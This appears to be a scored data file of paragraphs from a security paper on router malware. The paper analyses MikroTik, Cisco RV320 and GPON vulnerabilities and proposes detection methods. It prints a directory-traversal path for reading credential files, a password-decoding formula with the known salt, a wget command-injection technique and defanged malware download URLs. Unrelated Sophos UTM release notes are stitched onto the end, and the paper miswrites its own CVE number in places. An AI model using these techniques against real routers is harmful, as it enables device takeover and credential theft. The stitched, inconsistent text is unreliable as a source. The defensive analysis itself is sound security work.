"With the presence of routers in every home and corporate environment, finding a zero-day which will compromise thousands of devices would be hitting the jackpot for cybercriminals. N-day vulnerabilities are those that are identified by analysing the security patch released by vendors to fix them. The observed trend suggests that threat actors are investing time and effort in identifying and exploiting zero-day and new n-day vulnerabilities. The time delay between the release of a patch and it actually being applied by the user provides a threat actor with a lot of opportunities.",0.010498948517753792
3. Vulnerabilities,0.0065943292952550525
"In this section we will discuss three reported router vulnerabilities, two of which are being exploited by malware to compromise devices.",0.009913473890105773
3.1 CVE-2018-14847,0.007910734604212433
"CVE-2018-14874 in MikroTik routers was one of the most exploited vulnerabilities in 2018. MikroTik is a networking device vendor based in Latvia, and the developer of the RouterOS software and RouterBOARD hardware. In April 2018, MikroTik patched an arbitrary file read/write vulnerability present in MikroTik RouterOS versions 6.29 through to 6.42. Throughout 2018 and up to the time of writing this paper, malware has been reported to be exploiting this vulnerability to compromise devices and distribute Coinhive cryptominers. There are still 40,000+ vulnerable devices around the world (Figure 5).",0.012462691187559716
Figure 5: Vulnerable MikroTik devices (source: Shodan).,0.02313925824716756
"MikroTik ships ‘WinBox’, a Windows client for management of MikroTik devices, which connects to RouterOS over TCP port 8291 (Figure 6). WinBox provides a GUI and command line interface for remote configuration and management of devices.",0.015388098698205566
Figure 6: MikroTik WinBox interface.,0.020777774621343337
"In RouterOS, ‘mproxy’ is the service responsible for handling requests over the WinBox port. ‘mproxy’ is a Linux executable which executes with support from various shared object files, most importantly libumsg.so and libubox.so. Figure 7 shows the output of a netstat command, showing the ‘mproxy’ service attached to port 8291.",0.010295087886126653
Figure 7: ‘mproxy’ service listening on port 8291.,0.013696291933208982
Test environment details,0.008965225857627268
"For analysis, we used RouterOS 6.39.3 (bugfix) to set up a router on a VirtualBox VM. A VM hosting Ubuntu 16.04 with Python 2.7.12 was used to interact with the device. We used Mikrotik_tools [5] to jailbreak and get telnet access to the device in order to set up a remote debugging server. GDBServer for i686 [6] was attached to the ‘mproxy’ service and executed. GDB 7.11.1 with Python Exploit Development Assistance (PEDA) [7] was used to connect to GDBServer remotely.",0.013150348464312622
Analysis,0.009005314284015964
"RouterOS uses its unique message format to interact with WinBox. A detailed analysis of the WinBox message format along with communication over the WinBox port to exploit the CVE-2018-14847 vulnerability was presented at DerbyCon 2018 [8]. In this paper, however, we shall focus on how the input is passed and processed at runtime by executing a part of the script extracted from the malware that exploits CVE-2018-14847 to read user data from the device. We shall continue our detailed discussion on the workings of the malware later in this section. Multiple proof of concepts (PoCs) have been published since the release of the patch from MikroTik [9, 10].",0.009765649598780901
"During static analysis of the ‘mproxy’ service, interesting strings were observed, which were accessed during execution of file open system calls used to access files for reading and writing, as we will discuss later in this section (Figure 8).",0.01555906249229111
Figure 8: Snippet of strings from ‘mproxy’ service.,0.012467652053563372
Figure 9: Function call in malware.,0.0165712356747012
Figure 9 shows the function call in the script which is trying to read /flash/rw/store/user.dat. User.dat contains encoded user credentials for device access.,0.014327968443097805
"Executing this script with a debugger attached to the mproxy service, we were able to identify the string passed as input. As can be seen in Figure 10, no filtering or validation has been performed on the device during the input operation, resulting in special characters being passed as input.",0.008228616094227093
Figure 10: Input string as seen during remote debugging.,0.013075571564084343
"‘/home/web/webfig’ is the hard-coded directory value which will be read during the file read operation (as seen in Figure 8). The input received is processed, and this hard-coded value is prepended at the beginning of the string to complete the file path to be read (Figure 11).",0.015414949306876036
Figure 11: File path to be read as seen during remote debugging.,0.011916258588997586
"Once the string is updated, the ‘mproxy’ service checks if the file being accessed is a ‘.json’ or ‘.backup’ file by making a call to the isSensitiveFile() function. This function compares the extension of the file being accessed and allows or denies access. If the requested file is a sensitive file, access is denied, and the executed script fails.",0.011868676885821938
Figure 12: File extension is compared to .json and .backup.,0.007543245384503683
"If the accessed file is not sensitive, the file path is passed to the open system call (Figure 13) and the file read is successful. No check is performed to validate access to the file path that is requested for access.",0.009431232123502498
The open system call argument is as follows:,0.008898001013859291
‘/home/web/webfig//////./..//////./..//////./../flash/rw/store/user.dat’,0.011841045660707983
Figure 13: Arguments passed to open system call.,0.012736419892592776
"To summarize CVE-2018-14847, since insufficient validation is performed on the device during reading and processing input, the file name string passed as an argument with special characters to an open system call will lead to directory traversal, hence allowing arbitrary file read on the device, and thus information disclosure.",0.01154903531609941
Another issue which allowed the abuse of MikroTik devices is the use of weak password encoding using the hash of username and the known salt ‘283i4jfkai3389’ while storing user credentials [11]. Details accessed from the user.dat file can easily be decoded using the logic shown in Figure 14.,0.00898583843736378
key = md5(<username> + 283i4jfkai3389)clear_text_password ^ key = encrypted_password,0.01090215024001484
Figure 14: Function to decode user password present in analysed sample.,0.013670140279276377
Case study,0.008910029232508943
"A piece of malware [A3] (a Windows PE binary) was reported in the wild exploiting the discussed vulnerability by disguising itself as a browser update for Windows [12]. Upon successful execution, this malware would connect to a MikroTik router over TCP port 8291 to compromise the device and inject the Coinhive cryptominer link when any HTTP request is made.",0.011650083065415595
Coinhive has discontinued its operations as of 8 March 2019 (Figure 15).,0.02790338247944746
Figure 15: Discontinuation of Coinhive.,0.014432400183473248
"During static analysis of the sample we observed strings suggesting that the file has been created using Python (Figure 16), and that the file is packed with UPX.",0.017100385354663294
Figure 16: Strings in malware binary showing use of Python.,0.01591320281827402
"The unpacked file seems to be an installer with an alert box hard coded to display a fake error message. We also observed random DNS requests for ‘hxxp://iplogger.co/xxxxxx’, which was not available at the time of writing. Extracting the Python SFX installer and decompiling the resulting Python compiled code (.pyc) file, we obtained two interesting files:",0.017217107692230504
upd_browser.py,0.010111090223262953
ups.py (imported by upd_broswer.py),0.014136572566762928
Analysis of these files provided us with the following information:,0.011264385060728688
"There is a hard-coded IP in ups.py, which resolves to Russia (still alive as of 9 May 2019) (Figure 17).",0.014824181766326716
Figure 17: Hard-coded IP address.,0.015273574023199843
"The sample initiates a request to read ‘/////./..//////./..//////./../flash/rw/store/user.dat’, which, as already discussed, stores user credentials.",0.012062091563877608
"The sample initiates a request to write to scheduler files. As you might expect, these files are responsible for scheduling the scripts to execute (Figure 18).",0.015588508309173021
Figure 18: Files write request.,0.01216942317464198
"The sample contains RouterOS terminal commands as part of the script ‘sh113’ which will be uploaded to the device using scheduler.dat, and scheduled to execute automatically eight minutes after device startup (Figures 19, 20).",0.010470818936057946
Figure 19: Snippet from sh113 script.,0.014274199985287672
Figure 20: Scheduled script.,0.015724373147438575
Detailed analysis of behavioural and structural changes on the device will be discussed in section 5.2.1.,0.00782250609078039
"Following successful infection of the device, every time a user tries to access any web page (HTTP), the router would serve a page which contains the Coinhive miner. The requested page is loaded within a frame (Figure 21), and the Coinhive miner would start computation abusing the user’s system resources.",0.016331046526850912
Figure 21: Source code of HTML page served.,0.014573334324559872
3.2 CVE-2019-1652,0.007831547634707614
Cisco RV series routers are relatively low-cost small business networking devices which provide reliable and secure connectivity out-of-the-box.,0.01987000320499277
"CVE-2019-1652 is a vulnerability present in firmware version 1.4.2.15 on the Cisco RV 32* series of business routers. It was identified and reported in January 2019 [13]. This vulnerability allows an authenticated adversary to execute commands remotely on the device. Another vulnerability in the same device, CVE‑2019-1653, allows an adversary to access configuration files without authentication. These two vulnerabilities, combined together, have been demonstrated to give control of a compromised device to an unauthenticated remote attacker. There is no known malware exploiting CVE-2019-1652 at the time of writing this paper. However, researchers have published a PoC [14] based on the vulnerability disclosure report [13] demonstrating its impact. Cisco patched the reported vulnerability in firmware version 1.4.2.20, but this patch was not the complete fix as we will discuss in the analysis below.",0.014829793730204766
The Cisco RV32* series of routers allow users to generate self-signed certificates on the device by accessing the Certificate Management -> Certificate Generator page (Figure 22).,0.014910562667877048
Figure 22: Cisco certificate generation page.,0.02557698113393836
Test environment details,0.008965225857627268
We used patch diffing to analyse Cisco RV 320 firmware version RV32X_v1.4.2.15 and RV32X_v1.4.2.20.,0.01617664226216331
Analysis,0.009005314284015964
"Firmware was extracted using Binwalk [15]. The extracted firmware was observed to be using the cramfs [16] root file system and nginx [17] web server with CGI enabled. On further analysing HTML pages available in the web server root directory, we observed that these pages are using a custom Server Side Includes (SSI) command, nk_get, implemented with the help of ssi.cgi, a script located in the cgi-bin directory.",0.010741022608968143
"When the user accesses ‘Certificate Generator’ via the web interface, self_generator.htm is loaded in the browser. Client-side input validation has been implemented using JS on this page (Figure 23). When user clicks ‘Save’, the input is validated and submitted to certificate_handle2.htm.",0.020532219661253293
Figure 23: Client-side input validation.,0.015929587941887924
"The ssi.cgi file contains a function of interest, NK_UiSelfGenCert(), which reads the data passed from self_generator.htm using NK_query_entry_get() into local variables and passes them on to an openssl command to be executed on the system. Figure 24 shows a string being constructed to use an openssl command along with arguments passed to it. This string is passed to a system() call to be executed as a terminal command.",0.008323802791436075
Figure 24: Code snippet showing openssl command in ssi.cgi.,0.015011417208521838
"On analysing ssi.cgi, we did not find any evidence of server-side input validation. Absence of server-side validation allows an adversary to pass parameters with special characters by bypassing the browser.",0.015897516840807535
"When a Linux command is passed in the Common Name (CN) field, bypassing the input validation checks on the browser, the command is executed on the device terminal. Clearly, the ssi.cgi script present on the device is not validating input to the server properly, thus allowing command injection.",0.01094875212956603
"On comparing two interesting files, ssi.cgi and nginx.conf, in both versions of firmware, we observed the following differences implemented in order to prevent exploitation of this vulnerability:",0.00804556109748611
"1. Check for CN value in ssi.cgi file: Figures 25 and 26 show snippets of decompiled code from NK_UiSelfGenCert() in the ssi.cgi file. As can be seen, the updated version has a check to validate for a non-null value of CN before proceeding with the openssl command execution. The same check has been implemented in the NK_GenCertForOPENVPN() function as well.",0.010097378022464798
Figure 25: Code snippet from ssi.cgi NK_UiSelfGenCert function call in firmware v1.4.2.15.,0.010344134732552246
Figure 26: Code snippet from ssi.cgi NK_UiSelfGenCert function call in firmware v1.4.2.20.,0.010510687109533956
"2. In nginx.conf, the configuration was updated to block messages with HTTP agent ‘CURL’ (Figure 27). The short-term implemented fixes can easily be bypassed to exploit the vulnerability [13], which has been patched in later versions of the firmware.",0.009304828634104645
Figure 27: Snippet from nginx.conf file showing check for CURL user agent.,0.011837449140279843
Case study,0.008910029232508943
"At the time of writing this paper, no malware has yet been reported to exploit CVE-2019-1652. For the case study, we analysed the PoC available on GitHub [14] exploiting this vulnerability. Since this is an authenticated remote code execution vulnerability, the adversary initially needs to establish a session with the router. This can be achieved using credential brute-force, if easily guessable or default passwords are used, or by exploiting CVE-2019-1653, which allows unauthenticated access to the configuration files on the device, thus allowing an adversary to gain access to the device’s authentication details.",0.009971828883295175
"Once a session is established, an HTTP post request is sent to certificate_handle2.htm with data that will be passed as parameters to an openssl command. Figure 28 shows a POST request being sent to the router. The command to be executed on the device terminal is passed as a payload via the common_name parameter.",0.011052639435031208
Figure 28: Snippet from PoC showing vulnerability exploitation (source: [14]).,0.017389059350545577
"This command execution will be blind, i.e. no output will be received in response to the executed command. For vulnerability reporting, researchers executed the ping command on the device and observed network traffic to confirm the vulnerability.",0.01120082740202677
Behavioural and structural changes on the device post exploitation will be discussed briefly in section 5.2.2.,0.010480835355675122
3.3 CVE-2018-10561,0.008023063636515393
Dasan Zhone Solutions (DZS) is a network access solution provider based in California.,0.014882035061188126
"CVE-2018-10561 is a web interface vulnerability reported in DZS GPON ZNID-GPON-25XX series routers in 2018, which allows adversaries to bypass authentication in the web interface of the router [18]. Another vulnerability, CVE-2018-10562, allows adversaries to inject and execute a terminal command on the device. These two vulnerabilities, when used together, may allow an unauthenticated adversary to control the device remotely. Well-known malware families such as Satori have been identified in the wild exploiting this vulnerability to compromise devices and spread infections.",0.010195629590187605
CVE-2018-10561 allows adversaries to bypass authentication by appending a string ‘?images/’ at the end of the accessed URL in the POST request. Figure 29 shows a code snippet from a Satori sample [A4] sending a POST request to ‘?GponForm/diag_Forms?images/’. This will allow an adversary to bypass authentication and access the diag_Forms page via the web interface. This vulnerability seems to be the result of inadequate handling of HTTP POST requests on the server when an improper Universal Resource Identifier (URI) is passed.,0.00885915646876878
The data part of the POST request consists of a wget command to download a malicious script to the /tmp directory (Figure 29). These commands are concatenated to the dest_host parameter being passed to the ping command available as a feature for network diagnostics. This leads to a command injection vulnerability (CVE-2018-10562). Further requests will be used to execute the malicious script on the device.,0.009786162405371002
Figure 29: Snippet from Satori sample [A4].,0.00890875304639327
"As a result of CVE-2018-10561, an unauthenticated remote adversary can access the management web interface of the device. Further, combining this with CVE-2018-10562, an unauthenticated remote adversary can download and execute malicious scripts compromising and taking control of the device.",0.007916224592534382
Behavioural and structural changes on the device will be discussed briefly in section 5.2.3.,0.013588024751616246
4. Common malicious operations on compromised routers,0.007968255066504448
"Once a device has been compromised, threat actors use the device for various malicious operations. In the case of routers, these operations result in a greater threat since a single router may be connected to and handle traffic from hundreds of users within an organization.",0.019070422676693233
"Shown below is a list of malicious operations that compromised devices typically perform, and their impact:",0.00730691572590525
"a. BotnetAs discussed earlier in the paper, creating and maintaining a botnet of routers is easy due to the inherent ease with which vulnerabilities can be exploited and the lack of proper device management. Malware that compromises devices to make them part of a botnet usually has the capability to act based on the commands received. The modular development approach observed in recent malware samples allows threat actors to add and remove such functionality on the fly.These botnets can be used for multiple operations, ranging from DDoS attacks to establishing a proxy chain to route traffic and send spam mails. The Mirai botnet gained infamy for its ability to generate traffic in terabytes/seconds in order to carry out lethal DDoS attacks.b. Exfiltration of dataData exfiltration is one of the most serious security issues. There have been instances of malware on Windows and Linux systems trying to collect and send sensitive data from within the network to command-and-control (C&C) infrastructure.With router malware, this threat becomes more consequential since there is typically no security layer or device present between the router and the outside world which could identify occurrences of such leaks. Additionally, if the security of websites is not properly configured, browsers cannot identify if there is any Man-in-the-Router siphoning off of data.c. Distribution of malicious linksSince infected devices have access to all the traffic flowing in and out of the network, they can manipulate traffic to distribute or redirect users to malicious content.",0.013951491108990188
Modify DNS: Malware such as DNSChanger updates the DNS settings of the device it compromises to point to a malicious DNS. These are then used to serve up infected and phishing web pages.,0.010021114895227945
"Distribute Coin miner: One such case has already been discussed in section 2.3.1, where the router was compromised and coin miners were distributed to all users accessing web pages via HTTP.",0.012019793488801112
"d. ProxyHaving access to all the traffic allows compromised devices to also act as a proxy and to monitor data. To capture encrypted data, modules to strip SSL connections are used, allowing threat actors to access data in clear text. A properly configured website with HTTP Strict Transport Security (HSTS) enabled can prevent the leaking of data to such adversaries.",0.013500880570060825
"Active proxy: As the name suggests, in an active proxy, a compromised device can modify data which is flowing through. This can be used to distribute malicious content and links or redirect users to malicious websites.",0.009421374311229358
"Passive proxy: In this case a compromised device may not modify data flowing through, but can monitor and siphon off sensitive data.",0.01392894081555196
5. IoCs and behavioural changes,0.009886225430036255
"Now that we have seen different vulnerabilities and how these vulnerabilities allow threat actors to compromise devices to perform malicious operations, let’s discuss some common IoCs and behavioural changes observed on these compromised devices.",0.014821915192363644
5.1 Expected behaviour of a router,0.006693802794197956
"Routers are devices working at the network layer to forward packets from different types of networks. Practically, over the years, several other functionalities have been added to the router device available on the market today, but its core functionalities have remained the same throughout its lifetime.",0.013037933375094846
The following is a list of expected functionalities and behaviours of a router:,0.009124603885622418
Be able to inspect destination address in the packet IP header and forward the packet to the correct network.,0.014754635413531614
Be secure against network attacks.,0.012973827024247209
"Maintain an availability of 99% and above, and avoid restarting without an explicit command issued by the administrator.",0.013629157895167054
"Avoid reading and modifying content of data field of packets passing through, which would affect the confidentiality and integrity of the communication channel.",0.011574728827800085
A compromised router tends to deviate from at least one of the above behaviours.,0.01278615956932716
5.2 Behavioural and structural changes,0.009194579794331359
5.2.1 CVE-2018-14847,0.007079207445501723
"On successful exploitation, scripts uploaded to a compromised MikroTik router perform the following modifications to the device:",0.013466673647324123
Enable web proxy on port 8080 and configure the device firewall to forward incoming requests for port 80 to the web proxy.,0.013034385485069522
Update DNS servers on the router.,0.013941159765741618
94.247.X.X - resolving to Germany,0.011261994451454704
107.172.X.X - resolving to USA,0.011590795940795817
128.52.X.X - resolving to USA,0.01057660571885144
163.53.X.X - resolving to Australia,0.010299079658162347
185.208.X.X - resolving to Netherlands,0.010744317412471838
Update NTP servers on the router,0.008947292407213259
88.147.X.X - resolving to Russia,0.010826015197898275
88.147.X.X - resolving to Russia,0.010826015197898275
"Add scheduler script Upd111, which will check for connections to the URL hxxp://iplogger.co/1xxxx6 on device startup.",0.010208639568281885
Add scheduler script Upd112 to remove the original script ‘sh113’ on startup.,0.015247968026528946
Add scheduler script Upd113 to create a file called u113.rcs with the data fetched from one of the following URLs:,0.009913845140127497
hxxp://min01[.]com:31416/min01?key={keybase58}&part={part}\\,0.009753405415253491
hxxp://mikr0tik[.]com:31416/mikr0tik?key={keybase58}&part={part}\\,0.010642601531731022
hxxp://up0[.]bit:31416/up0?key={keybase58}&part={part}\\,0.010499398687808581
"Add scheduler script Upd114, which will check the connection to the URL",0.008680388326216537
hxxp://iplogger.co/1xxxx6 every 12 hours.,0.01193491099110744
Figure 30 shows all scheduled scripts.,0.015696692207196827
Figure 30: Scheduled scripts post device reboot.,0.016554672263408454
"Create a web proxy error page which will serve the Coinhive miner every time a user requests a web page (Figure 31). Whenever a user tries to access an HTTP page this page is served up, which initializes the Coinhive miner operation on the accessing user’s device.",0.027103995833673622
Figure 31: HTML page that will be served to the user.,0.013377121728511243
5.2.2 CVE-2019-1652,0.0069770133616544605
"Researchers have demonstrated that, upon successful exploitation of CVE-2019-1652, terminal commands such as cat, ping and telnetd can be executed.",0.010834841522082694
"Successful execution of the telnetd command means an adversary can enable access to the telnet port, and upload and execute malicious scripts by connecting to it, resulting in remote control of the device. As we have already seen in the case of CVE-2018-14874, once an adversary has access to a device to upload and execute a script, it becomes effortless to carry out malicious operations. At the time of writing, we are not aware of the extent to which commands can be executed on the limited shell on Cisco RV 32* series routers.",0.006171342436044669
5.2.3 CVE-2018-10561,0.007181908084495148
"This vulnerability allows a remote attacker to bypass authentication to access the web management interface of a router device. It allows an attacker to control the device and its configuration, and to recruit it as a part of a botnet to spread infections and carry out other malicious operations discussed in the previous section.",0.007299808504398597
5.3 Indicators of compromise,0.0077299263163707055
"In case of routers and security products, we can classify IoCs into two categories.",0.011912823143589657
5.3.1 Indicators that can be identified by a non-intrusive security product,0.006490663780662542
These are indicators that can be identified by a security product without installing any agent on the device by correlating data from security products installed on heterogeneous devices on the network:,0.008558384935367203
"Router restarting without command issued by administrator: when there is no connection established to the device from the administrator’s system over specific ports, and yet the device restarts.",0.011660752445850742
"Router distributing malicious code: this can be identified if there are multiple detections at the browser level for similar malicious activity/infections, across user devices and websites.",0.009915301593871106
Traffic getting routed through malicious DNS servers: this can be identified if websites are continuously being redirected to malicious/phishing URLs.,0.01370936060831418
Network traffic analysis: if there is a flow of traffic between the router and the endpoint device over non-standard ports.,0.01379241963898925
Browser giving a warning about a MitM kind of attack: newer versions of browsers give a warning if the connection is not secure.,0.012851859191679749
5.3.2 Indicators that can be identified by an intrusive security product,0.006908886576270201
These are indicators that can be identified by a security agent installed on the router:,0.00673741761195501
Access made to the router from an external IP address: when the device is accessed from an external IP address as a result of exposed ports/services.,0.008763053283449174
Access to arbitrary file location: when file-access to any arbitrary location is made.,0.009922228132886457
Enabling/disabling of services.,0.013150055436091601
Presence of scheduled tasks.,0.015802127437927638
Presence of scripts to check connectivity with external server.,0.012069429224072725
6. Detection methods,0.009737170117966931
"Before getting into the discussion of a generic detection approach, let’s discuss the internals of two existing solutions implemented by security vendors.",0.018967362500663
6.1 Existing solutions,0.008069871796188233
VPNFilter Checker [19],0.009481967720052276
VPNFilter Checker is a security tool used to identify if a router has been infected by VPNFilter malware.,0.01182304037964188
"VPNFilter is a multi-stage and modular malware with versatile capabilities. It maintains persistence through the reboot by adding itself to crontab and job scheduler. It operates with a C&C server via Tor or SSL connections. Most of the strings are encrypted to be decrypted at runtime with RC4. After initialization, it starts to download images from the fed URLs. It fetches the server’s IP address through the metadata of the first image in the album it’s referring to. The IP address is extracted from the geolocation coordinates (latitude, longitude fields) in the EXIF information.",0.010422758712969493
Figure 32: Strings in VPNFilter referring to Tor.,0.015626692833172084
"It performs a second-stage download to set up its environment by creating a modules folder and a working directory. It reaches out to its C&C server for the commands to execute on the compromised device. When the Tor module is installed, it connects to a hidden service (.onion domain) through a SOCKS5 proxy within the module (Figure 32).",0.015129269445742666
"In the third stage, the malware uses different plug-in modules for different architectures. One particular module, ‘ssler’, intercepts and redirects traffic destined for port 80 to listening port 8888. The ssler dumps all the interesting traffic sent by the client through ‘sslstripping’. When ssler makes a connection to a legitimate HTTP server, the response is also intercepted and altered, for example by changing the HTTPS instances in the location header to HTTP and removing headers like Vary, Content Security Policy (CSP), and Access-Control-Allow-Origin.",0.011459005747293971
"The vpnfilter check sends a request to a server and checks whether the response header ‘Vary’ has been tampered with by the ssler, since response headers like Vary and content-security-policy are stripped by ssler before forwarding the remaining headers to the client.",0.013843831530815143
If the ‘Vary’ header is present then the device is not compromised (Figure 33).,0.018985227930568005
Figure 33: JS to check ‘Vary’ in HTTP header.,0.012311483771051623
"Drawback: Obviously, since the script is only checking for the ‘Vary’ header field, if the malware is updated to modify other header values not affecting the Vary header, this solution would need to be updated to detect compromised devices.",0.011272440831979091
Router DNS Checker [20],0.009001550787839041
"As already discussed, malware like DNSChanger compromises routers and updates their DNS entries to DNS servers controlled by threat actors, which redirect users to malicious and phishing domains.",0.014291943224489012
"DNS Checker sends GET requests to the authoritative name server controlled by the creator of the security tool [20], which in response sends a URL with an API key to connect to. This URL consists of a randomly generated string concatenated with the server domain name (Figure 34).",0.019061643758383262
Figure 34: DNSChecker URL to connect.,0.013078774833852336
"A DNS request is sent to the suggested URL (Figure 35). The name server captures the request and checks the DNS server which has requested the information. If the DNS server forwarding the request is blacklisted, the user will get a ‘compromised device’ alert.",0.014090306202322767
Figure 35: DNS request for suggested URL.,0.014796143311344268
"Drawback: To identify if the router is compromised, the DNS server from which requests are being forwarded needs to be blacklisted. This solution would fail if the server is not already blacklisted. The response sent back contains a field, ‘verdict’, which will be set to ‘good’ if the router is not compromised. During our testing, we even got the response ‘uncertain’, which shows inefficiencies in the current implementation (Figure 36).",0.012273160111654469
Figure 36: ‘verdict: uncertain’ response.,0.013776540167166562
6.2 Proposed solution,0.007570940274666871
"We need a three-pronged attack to counter router malware: router vendors need to include security as a core part of design and development, users need to be alert and aware to install upgrades as and when available, and security products need to be developed with router security in mind.",0.014725110022584142
Network device vendors need to include security as a part of their software development lifecycle. Vendors also need to follow the following policies:,0.008889150279556834
Force users to reset default passwords.,0.013628464098637938
"Follow strict password policies – special characters in passwords, regularly reset passwords.",0.015405531805733563
Keep non-essential services disabled by default.,0.016312484024028406
"For the proposed detection approach, we are making the following assumptions:",0.02640409092318452
Administrator’s IP is known and static.,0.010371918756976628
"Any communication addressed to the router on non-standard ports other than 80, 443 or router vendor-specific port like 8291, is considered suspicious.",0.01635322031816422
Access to router’s management interface from an unknown IP is considered suspicious.,0.010567683109791282
"If the integrity of packets on standard ports with a predefined format is affected, this is considered suspicious.",0.01002958412762589
Security products need to be developed with the specific requirements of router security in mind.,0.014344214319416682
A non-intrusive detection system needs to have the following components which will complement one another to detect and alert administrators (Figure 37):,0.011076287841869648
"Module to continuously check for device availability: this module continuously polls the device at regular intervals and will alert the administrator of suspicious activity if the device is not available and no connection was made to the device from an administrator’s IP, i.e. in the process of rebooting.",0.011928303242401461
"Module to monitor traffic anomalies with regards to communication over non-standard ports: this module will alert on suspicious changes in traffic flow, for instance if there is traffic flow from and to the router on non-standard ports. For this to work, products need to have a list of standard ports on which communication takes place on the network.",0.013042818639769527
Browser module to correlate alerts for:,0.007702552799160878
"Malicious websites alert on different machines and different websites: if the browser module on multiple machines is generating an alert for a malicious or phishing site, there is a high probability that traffic is being directed to a malicious DNS.",0.01306740449282795
"Browser alerts for MitM: modern browsers alert users if the connection between the client and the web server is not secure. A threshold can be set for such alerts, and if that threshold is exceeded, administrators can be alerted.",0.009943107770493675
Malicious code and DNS detection on different machines and different websites: this module can request a web page from an AV-controlled server. Security products can perform integrity checks on various parts of the response to conclude if the response is being altered.,0.009975164535232506
"Module to scan for default/weak passwords and vulnerability scan on the router to identify exposed services, when security product is first installed. This scan can be scheduled to execute regularly based on the organization’s security policy.",0.011795459948555242
Figure 37: Proposed malware detection approach.,0.022166419713229857
"The proposed approach has certain obvious limitations and drawbacks. Security vendors would need to maintain a list of blacklisted websites and DNS servers. In addition, any such implemented system needs to be studied in depth for its performance impact and false positive risks, and fine-tuned to reduce both.",0.013895908290800452
Conclusion,0.008171308922719556
"This paper started with a discussion of infection vectors affecting routers. We then analysed three vulnerabilities in particular, and discussed how easily these can be exploited by threat actors. We also discussed the malicious operation of compromised devices, and IoCs and behavioural changes on the device. Finally, we discussed a proposed approach to alert administrators about a possible router infection.",0.012047403762533992
"Security is an ever-changing field, and with the identification of new techniques, the proposed approach will also need to evolve to protect end-users.",0.01637233944148231
References,0.0158494738281566
"[1] Krebs, B. Source Code for IoT Botnet ‘Mirai’ Released . https://krebsonsecurity.com/2016/10/source-code-for-iot-botnet-mirai-released/ (accessed: 25 April 2019).",0.014384490986386722
[2] UPnP. http://www.upnp-hacks.org/upnp.html (accessed: 25 April 2019).,0.011533497896497269
[3] DefenseCode Security Advisory Broadcom UPnP Remote Preauth Code Execution Vulnerability. https://www.defensecode.com/public/DefenseCode_Broadcom_Security_Advisory.pdf (accessed: 01 May 2019).,0.00758566174379216
[4] BCMPUPnP_Hunter: A 100k Botnet Turns Home Routers to Email Spammers. https://blog.netlab.360.com/bcmpupnp_hunter-a-100k-botnet-turns-home-routers-to-email-spammers-en/ (accessed: 01 May 2019).,0.01572630107506401
[5] Mikrotik-tools. https://github.com/0ki/mikrotik-tools (accessed: 10 April 2019).,0.011528122691250364
[6] Embedded tools. https://github.com/rapid7/embedded-tools (accessed: 10 April 2019).,0.011829891533314374
[7] PEDA. https://github.com/longld/peda (accessed: 10 April 2019).,0.01219279991879696
[8] Bug hunting in RouterOS. https://github.com/tenable/routeros/blob/master/bug_hunting_in_routeros_derbycon_2018.pdf (accessed: 20 April 2019).,0.010859031426016408
[9] Proof of Concept of Winbox Critical Vulnerability (CVE-2018-14847). https://github.com/BasuCert/WinboxPoC (accessed: 05 June 2019).,0.010966337945799931
[10] By the Way. https://github.com/tenable/routeros/tree/master/poc/bytheway (accessed: 05 June 2019).,0.01316501020137184
[11] extract_user.py. https://github.com/BigNerd95/RouterOS-Backup-Tools/blob/master/extract_user.py (accessed: 09 May 2019).,0.010615074802811209
"[12] @hasherezade; Segura, J. Fake browser update seeks to compromise more MikroTik routers. https://blog.malwarebytes.com/threat-analysis/2018/10/fake-browser-update-seeks-to-compromise-more-mikrotik-routers/ (accessed: 20 April 2019).",0.014833954122900561
[13] Cisco RV320 Command Injection. https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection (accessed: 10 April 2019).,0.013253434428972533
[14] CVE-2019-1652 /CVE-2019-1653 Exploits For Dumping Cisco RV320 Configurations & Debugging Data AND Remote Root Exploit! https://github.com/0x27/CiscoRV320Dump (accessed: 30 April 2019).,0.00876493658305122
[15] Firmware Analysis Tool. https://github.com/ReFirmLabs/binwalk (accessed: 15 April 2019).,0.011850860301519495
[16] cramfs.txt. https://github.com/torvalds/linux/blob/master/Documentation/filesystems/cramfs.txt (accessed: 15 April 2019).,0.011579394125747378
[17] NGINX. https://www.nginx.com/ (accessed: 15 April 2019).,0.012582361975247092
[18] Critical RCE Vulnerability Found in Over a Million GPON Home Routers. https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/ (accessed: 20 May 2019).,0.009149191378557964
[19] Check Your Router for VPNFilter. http://securityresponse.symantec.com/filtercheck/ (accessed: 10 April 2019).,0.011531308388888939
[20] F-Secure Router Checker. https://www.f-secure.com/en/web/home_global/router-checker (accessed: 10 April 2019).,0.010150021683869692
Appendix: Sample hashes,0.009471864423548637
Threat name,0.00848899691352245
Sample hash (SHA256),0.01738264361880859
A1,0.00849374195122199
Mirai,0.008401250263640025
15246e6dc4e95215bb57a75de06f6e4e7e399b17cf4e9d1ef7687db2214c1542,0.010018534335302753
A2,0.008252268637641391
BCMUPnP_Hunter,0.008609048183133794
0dc2ab1c36a74f3fa01001f7ee62d74bf8b6f2d97ea2e9c84103d14260f224fa,0.010308821947251356
A3,0.008387043444760711
MikroTik_sample,0.009305392259821077
57eb8c673fc6a351b8c15310e507233860876ba813ed6ac633e9af329a0bbaa0,0.009746338715842517
A4,0.008129137327022029
Satori_GPON,0.008682722747875626
efa4fe06e4949c0f7aedea61a79da92e379ea66b169cd1d99c47b9e93e814093,0.009951098569589978
Footnotes,0.008231263626591545
"1 Hash can be found in reference table at the end.
",0.012882004922946
UTM Up2Date 9.210 Released,0.008491559192916776
"Written by
Eric Bégoc",0.010229904213713614
"November 27, 2014",0.008640137796994574
Network up2date UTM UTM 9,0.01007005226623292
"A new Up2Date package for Sophos UTM is available as of today.
Besides many fixes for which you will find details below, this update further reduces risks from the POODLE vulnerability (CVE-2014-3566) through fixes for SMTP and POP3.
If you want to update to UTM 9.3 please also read our knowledgebase article to make sure you understand available upgrade paths.",0.00921033689502826
"Sophos UTM 9.210 – Details
News",0.009472562560038922
Maintenance Release,0.008862652998154363
Remarks,0.009780636038266843
"System will be rebooted
Configuration will be upgraded
Connected Wifi APs will perform firmware upgrade",0.008729859254918315
Bugfixes,0.009816324567177737
"27257 RED50 frequently reconnecting because configuring an Additional Address as UTM-Hostname is not supported
27588 Unable to fetch POP3 accounts on iOS devices via POP3 Proxy
27647 aua does not work with facility http while installing basic guard license
27905 [BETA] log the mac addresses human readable with leading zeros in the packetfilter log
28056 it’s not possible to view or download large log files in the webadmin because root partition is too small
28400 Syslog not started after ipsbundle pattern installation
28842 HA takeover if master reboots takes too much time
28966 exceptions for Common Threat Filters do not work individually
29412 Wireless Security Manager Role can’t accept new AP’s
